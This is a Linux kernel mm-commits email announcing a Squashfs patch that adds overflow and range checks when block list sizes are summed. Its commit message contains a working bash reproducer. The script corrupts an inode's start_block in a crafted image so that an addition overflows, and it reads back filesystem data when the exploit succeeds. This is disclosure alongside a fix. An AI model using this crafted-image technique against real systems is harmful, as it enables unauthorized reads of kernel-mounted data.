Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=100.103.45.18
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1795586048;
	b=ZKV3El4WsUgQru2bIZOHekHv09ST5ShHKO8BaugIjZOjJ+1dmd+3kOZA5/dEFP9XPTFR
	 QzLmqJpvOd4LAfXUvbNAiJNOor1RA3Y4BiGL9VNzEqrPt+g/V9BVIwAGbL4xj//XPTiyt
	 0uTqU7MC3rUjfFBjEO3Qbje9LoChRKnh6ZxKmxbNKqEaZE0IoixL1Ff0aD5i5ICh3+1vk
	 pBQPorwscv0JEwgPiuxNAKVId3DU7/J0lZx5NC96UzV+/Y2614TAXfF8f6/QqMy3Cy3BA
	 ggYo8pzBv6JjLRisO0/AG91bdQXwxWBUYhNgQ/AdD03vD6big0b6c8otRloH2ednJOQ==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1795586048;
	h=Received:DKIM-Signature:Date:To:From:In-Reply-To:References:Subject:
	 Message-Id;
	bh=A62IKRLlzBATulJqChZmBx93Xd41q4WbIakQQBQ6Q5w=;
	b=ieJQ8YGUvPLdzRQ7JJ4T8Q8ZcFYtmZtywMExwLRms7U/L+gVfseRm2KGrydMXmb18cyr
	 u+qAvtjtuQ1jSyQb7ElCl50SwsG1krMuTexUF6ns1PHHKKOXj2xFWeqx+YdJcFiqjPUE+
	 IwvFrDHJBfQL7ZYvUpkHpvtCT1SnI+L+aiAlXErmTGLndJOVF9mxPl+r4OpGqImqG9et9
	 J1wsSFbCJubhqe6ikSD7uU2g4PK0nNZtYRbWPaHF3t8CHBlYIhV81JBK5Vg0ME2bPazj/
	 MgNVvhQ3iQOwSlAwYTfPJKcYwYuK/HOtZNiO04RD9wSHiZ0766Wf2grAnEg963C+ydw==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dkim=pass header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=0Pi9q0PP;
	arc=none smtp.remote-ip=100.103.45.18
Received: from smtp.kernel.org (quasi.space.kernel.org [100.103.45.18])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D98A6606A31E
	for <mm-commits@vger.kernel.org>; Wed, 25 Nov 2026 05:54:08 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=linux-foundation.org header.i=@linux-foundation.org header.a=rsa-sha256 header.s=korg header.b=0Pi9q0PP
Received: by smtp.kernel.org (Postfix) with ESMTPSA id 48A821F000C6;
	Wed, 25 Nov 2026 05:54:08 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
	d=linux-foundation.org; s=korg; t=1795586048;
	bh=A62IKRLlzBATulJqChZmBx93Xd41q4WbIakQQBQ6Q5w=;
	h=Date:To:From:In-Reply-To:References:Subject;
	b=0Pi9q0PPZ4augsKo3Ut5LzlNfY7pIog4RgZEj/bN2Z1W1w0wOZ1m+ix0oU4aWYuKi
	 usn3jifwFEzp+/2/V9UKWo54PpX1nGL49cD3h9X/2fMUHrOQyOhdNaxn3coRCcpZxN
	 gP6GpevIbdAf5Lg8Ma7BVDDVzbqgSsbTtUSXRcrI=
Date: Tue, 24 Nov 2026 21:54:07 -0800
To: mm-commits@vger.kernel.org,phillip@squashfs.org.uk,
	akpm@linux-foundation.org
From: Andrew Morton <akpm@linux-foundation.org>
In-Reply-To: <20261125014737.347231-18-phillip@squashfs.org.uk>
References: <20261125014737.347231-18-phillip@squashfs.org.uk>
Subject: + squashfs-sanity-check-block-list-sizes-and-range.patch added to mm-nonmm-unstable branch
Message-Id: <20261125055408.48A821F000C6@smtp.kernel.org>
X-Mailing-List: mm-commits@vger.kernel.org
List-Id: <mm-commits.vger.kernel.org>
List-Post: <mailto:mm-commits@vger.kernel.org>
List-Help: <mailto:mm-commits+help@vger.kernel.org>
List-Subscribe: <mailto:mm-commits+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:mm-commits+unsubscribe@vger.kernel.org>
List-Owner: <mailto:mm-commits+owner@vger.kernel.org>
Precedence: list


The patch titled
     Subject: Squashfs: sanity check block list sizes and range
has been added to the -mm mm-nonmm-unstable branch.  Its filename is
     squashfs-sanity-check-block-list-sizes-and-range.patch

This patch will shortly appear at
     https://git.kernel.org/pub/scm/linux/kernel/git/akpm/25-new.git/tree/patches/squashfs-sanity-check-block-list-sizes-and-range.patch

This patch will later appear in the mm-nonmm-unstable branch at
    git://git.kernel.org/pub/scm/linux/kernel/git/akpm/mm

Before you just go and hit "reply", please:
   a) Consider who else should be cc'ed
   b) Prefer to cc a suitable mailing list as well
   c) Ideally: find the original patch on the mailing list and do a
      reply-to-all to that, adding suitable additional cc's

*** Remember to use Documentation/process/submit-checklist.rst when testing your code ***

The -mm tree is included into linux-next via various
branches at git://git.kernel.org/pub/scm/linux/kernel/git/akpm/mm
and is updated there most days

------------------------------------------------------
From: Phillip Lougher <phillip@squashfs.org.uk>
Subject: Squashfs: sanity check block list sizes and range
Date: Wed, 25 Nov 2026 01:47:31 +0000

A Squashfs file has a list of block sizes, storing the compressed size
of each data block.  This block list is scanned to discover the size and
location of block x, where the sizes of previous data blocks are added
to the start of the data blocks to produce the location.

But, when scanning this block list and adding the block sizes, the code
does not check for arithmetic overflow.  This means the data block start
location can be crafted to be close to 2^64, and so the addition of the
block sizes can cause arithmetic overflow and thereby evade any sanity
checks.

Additionally, the range (start and end) of the data block that is to be
read from the filesystem is not checked for correctness before
squasfs_read_data().

This commit adds checks for arithmetic overflow and sanity checks the
range of the data block before attempting to read from disk.

Reproducer
==========

The reproducer generates a Squashfs filesystem with a file with two
data blocks, and then corrupts the location of the start of the data
blocks to 2^64 - 128 KiB.  This added to the size of data block 0 (128
KiB) will overflow, producing a location of 0.  If the exploit succeeds,
when the second block is read, Squashfs will not produce an I/O error
and instead print the Squashfs filesystem superblock starting with hsqs.

====================================================================
#!/bin/bash

ARGS="-quiet -no-progress -noI -noD -no-sparse -no-fragments -comp gzip"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

echo "Create Squashfs filesystem with one file, with 2 data blocks"
echo "Create a hard link to it, to force Mksquashfs to use an extended inode"
echo "(more than one nlink).  This means the start_block field will"
echo "be 64-bits"

echo "/ d 0777 0 0" > pseudo
echo "zero f 0777 0 0 dd if=/dev/zero bs=1024 count=256 2>/dev/null" >> pseudo
echo "hardlink L zero" >> pseudo

if ! mksquashfs - img.sqsh -pf pseudo $ARGS; then
	echo Failed to create Squashfs filesystem
	finish

fi

echo "Corrupt the start_block field of file zero's inode, which"
echo "points to the start of the file's data blocks."
echo "Alter it to the value 0xFFFFFFFFFFFE0000 (2^64 - 128 KiB)."
echo "That value added to the size of the first data block (128 KiB)"
echo "will overflow"
echo "The inode start_block field is stored at byte offset 262258"

/usr/bin/echo -en "\x00\x00\xfe\xff\xff\xff\xff\xff" > file
dd if=file of=img.sqsh seek=262258 bs=1 count=8 conv=notrunc status=none

echo Mount the filesystem to /mnt

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

echo Read the file zero.
echo If the exploit succeeds, dd will not fail, and it will display the Squashfs
echo superblock, beginning with hsqs
echo

dd if=/mnt/zero bs=1024 skip=128

popd 2>&1> /dev/null

rm -rf $DIR
====================================================================

Link: https://patch.msgid.link/20261125014737.347231-18-phillip@squashfs.org.uk
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
Signed-off-by: Andrew Morton <akpm@linux-foundation.org>

 fs/squashfs/cache.c            |    2 +-
 fs/squashfs/file.c             |   27 +++++++++++++++++++++------
 fs/squashfs/squashfs_helpers.h |   20 +++++++++++++++++---
 3 files changed, 39 insertions(+), 10 deletions(-)

--- a/fs/squashfs/cache.c~squashfs-sanity-check-block-list-sizes-and-range
+++ a/fs/squashfs/cache.c
@@ -490,7 +490,7 @@ struct squashfs_cache_entry *squashfs_ge
 				u64 start_block, int length)
 {
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
-	int res = squashfs_check_range(start_block, length, msblk);
+	int res = squashfs_check_range(start_block, squashfs_frag_size(length, msblk->block_size), msblk);
 
 	if (res < 0)
 		return ERR_PTR(res);
--- a/fs/squashfs/file.c~squashfs-sanity-check-block-list-sizes-and-range
+++ a/fs/squashfs/file.c
@@ -281,6 +281,9 @@ static s64 fill_meta_index(struct inode
 			long long res = read_indexes(inode->i_sb, blocks,
 					&cur_index_block, &cur_offset);
 
+			if (res >= 0)
+				res = squashfs_add_indexes(cur_data_block, res, msblk);
+
 			if (res < 0) {
 				if (meta->entries == 0)
 					/*
@@ -292,7 +295,7 @@ static s64 fill_meta_index(struct inode
 				goto failed;
 			}
 
-			cur_data_block += res;
+			cur_data_block = res;
 			meta_entry = &meta->meta_entry[i - meta->offset];
 			meta_entry->index_block = cur_index_block -
 				msblk->inode_table;
@@ -353,8 +356,13 @@ static int read_blocklist_ptrs(struct in
 		blks = read_indexes(inode->i_sb, index - res, start, offset);
 		if (blks < 0)
 			return (int) blks;
-		if (block)
-			*block += blks;
+		if (block) {
+			res = squashfs_add_indexes(*block, blks, msblk);
+			if (res < 0)
+				return (int) res;
+
+			*block = res;
+		}
 	}
 
 	/*
@@ -491,8 +499,11 @@ static int squashfs_read_folio(struct fi
 
 		if (res == 0)
 			res = squashfs_readpage_sparse(folio, expected);
-		else
-			res = squashfs_readpage_block(folio, block, res, expected);
+		else {
+			res = squashfs_check_range(block, res, msblk);
+			if (res >= 0)
+				res = squashfs_readpage_block(folio, block, res, expected);
+		}
 	} else
 		res = squashfs_readpage_fragment(folio, expected);
 
@@ -628,7 +639,11 @@ static void squashfs_readahead(struct re
 		}
 
 		bsize = read_blocklist(inode, start >> msblk->block_log, &block);
-		if (bsize == 0)
+		if (bsize <= 0)
+			goto skip_pages;
+
+		bsize = squashfs_check_range(block, bsize, msblk);
+		if (bsize < 0)
 			goto skip_pages;
 
 		actor = squashfs_page_actor_init_special(msblk, pages, nr_pages,
--- a/fs/squashfs/squashfs_helpers.h~squashfs-sanity-check-block-list-sizes-and-range
+++ a/fs/squashfs/squashfs_helpers.h
@@ -240,10 +240,8 @@ static inline int squashfs_frag_size(u32
 	return size;
 }
 
-static inline int squashfs_check_range(u64 start_block, s32 disk_size, struct squashfs_sb_info *msblk)
+static inline int squashfs_check_range(u64 start_block, s32 size, struct squashfs_sb_info *msblk)
 {
-	int size = squashfs_frag_size(disk_size, msblk->block_size);
-
 	if (size < 0)
 		return size;
 
@@ -259,4 +257,20 @@ static inline int squashfs_check_range(u
 
 	return size;
 }
+
+static inline s64 squashfs_add_indexes(u64 block, s64 blks, struct squashfs_sb_info *msblk)
+{
+
+	if (block > S64_MAX)
+		return -EIO;
+
+	/*
+	 * the above check ensured block is not 2^63 or larger, and so
+	 * this addition will not overflow
+	 */
+	if (block + blks > msblk->inode_table)
+		return -EIO;
+
+	return block + blks;
+}
 #endif
_

Patches currently in -mm which might be from phillip@squashfs.org.uk are

squashfs-convert-squashfs_compressed_-to-inline-functions.patch
squashfs-convert-squashfs_inode_-and-squashfs_mkinode-to-inline-functions.patch
squashfs-convert-squashfs_fragment_-to-inline-functions.patch
squashfs-convert-squashfs_lookup_-to-inline-functions.patch
squashfs-convert-squashfs_id_-to-inline-functions.patch
squashfs-convert-squashfs_xattr_-to-inline-functions.patch
squashfs-fix-offset-in-squashfs_read_inode-trace-statements.patch
squashfs-dont-compute-start-or-alloc-memory-on-empty-directory-or-index.patch
squashfs-fix-fragment-bytes-overflow-on-32-bit-architectures.patch
squashfs-fix-fragment-index-table-length-too-large-exploit.patch
squashfs-sanity-check-inode-metadata-block-location.patch
squashfs-sanity-check-directory-metadata-block-location.patch
squashfs-widen-xattr-count-variables-and-add-sanity-check.patch
squashfs-very-large-files-can-exceed-an-int-or-size_t.patch
squashfs-add-more-sanity-checking-to-squashfs_block_size.patch
squashfs-sanity-check-fragment-block-location-and-range.patch
squashfs-sanity-check-block-list-sizes-and-range.patch
squashfs-dont-store-large-export-table-indexes-in-memory.patch
squashfs-dont-store-large-fragment-table-indexes-in-memory.patch
squashfs-dont-store-large-xattr-id-table-indexes-in-memory.patch
squashfs-fix-variables-in-directory-code-and-add-more-sanity-checks.patch
squashfs-fix-regression-in-squashfs_copy_cache.patch
squashfs-check-index-isnt-greater-than-s64_max-in-squashfs_read_data.patch

